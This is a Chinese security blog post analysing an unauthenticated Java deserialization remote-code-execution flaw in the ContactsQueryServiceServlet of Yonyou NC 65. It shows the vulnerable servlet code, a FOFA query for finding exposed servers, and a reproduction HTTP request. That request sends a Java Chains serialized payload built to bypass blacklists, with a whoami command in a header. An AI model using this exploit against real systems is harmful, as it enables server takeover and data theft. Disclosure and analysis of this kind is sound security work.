---
title: "用友NC ContactsQueryServiceServlet反序列化代码执行RCE漏洞"
source: https://mrxn.net/jswz/yonyou-nc-ContactsQueryServiceServlet-rce.html
asset_dir: assets/用友nc-contactsqueryserviceservlet反序列化代码执行rce漏洞
---

# 用友NC ContactsQueryServiceServlet反序列化代码执行RCE漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/10/8 08:37
- 837浏览
- [0评论](#comment)
- 13分钟阅读

深入探索

VPN服务

文本剥离工具

在线安全工具

---

# 漏洞简介

[用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)NC是用公司推出的一款企业管理[软件](#)，涵盖财务、供应链、生产制造等多个业务领域，旨在帮助企业实现信息化管理。用友NC的`ContactsQueryServiceServlet`组件存在反序列化漏洞。该Servlet在处理用户请求时，可能对接收到的序列化数据（如Java的`ObjectInputStream`）未进行安全检查，直接进行反序列化操作。攻击者可以构造恶意的序列化对象，其中包含可执行的代码，当`ContactsQueryServiceServlet`反序列化该恶意对象时，就会触发代码执行。该漏洞可能允许攻击者在服务器上[执行任意代码](https://mrxn.net/tag/rce)，从而完全控制服务器，窃取敏感数据，篡改系统配置，或进行其他恶意活动，对企业的业务系统和数据安全构成严重威胁。

漏洞预警服务

# 影响版本

NC 65

# fofa语法

> app="用友-UFIDA-NC"

# 漏洞分析

直接看下`ContactsQueryServiceServlet`的实现

```
public class ContactsQueryServiceServlet extends HttpServlet {
    private static final long serialVersionUID = -3711153542187076118L;

    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        ObjectInputStream in = new ObjectInputStream(request.getInputStream());
        HashMap<Object, Object> headInfo = new HashMap();

        try {
            headInfo = (HashMap)in.readObject();
```

由于代码在处理 HTTP 请求时，直接对用户传入的输入流进行 Java 反序列化操作（**`in.readObject()`**），且该操作发生在任何身份验证或安全检查之前，造成了未经身份验证的**远程代码执行（[RCE](https://mrxn.net/tag/rce)）漏洞**。攻击者可以构造恶意的序列化数据流，在服务器反序列化时执行任意代码。

软件

# 漏洞复现

```
POST /servlet/ContactsQueryServiceServlet?pageId=login HTTP/1.1
Host: nc.mrxn.net
Content-Type: application/x-java-serialized-object
X-Authorization: whoami

{{file(/tmp/javachains.ser)}}
```

使用`Java Chains` 的`TransformerWithDefiningClassLoader2`构造**绕黑名单**进行[命令执行](https://mrxn.net/tag/rce)回显payload

[![用友NC ContactsQueryServiceServlet反序列化代码执行RCE漏洞](images/img-001-b57541fc0e74.webp)](https://image.mrxn.net/9f4fd82858d74bb49e1dc0bdab7ecf70.webp)

[![用友NC ContactsQueryServiceServlet反序列化代码执行RCE漏洞](images/img-002-918c8d4d22d5.webp)](https://image.mrxn.net/e76132b15c9f47a1839a840dcb47614d.webp)

成功执行命令并回显执行结果

安全工具开发

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#rce](https://mrxn.net/tag/rce)
- [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
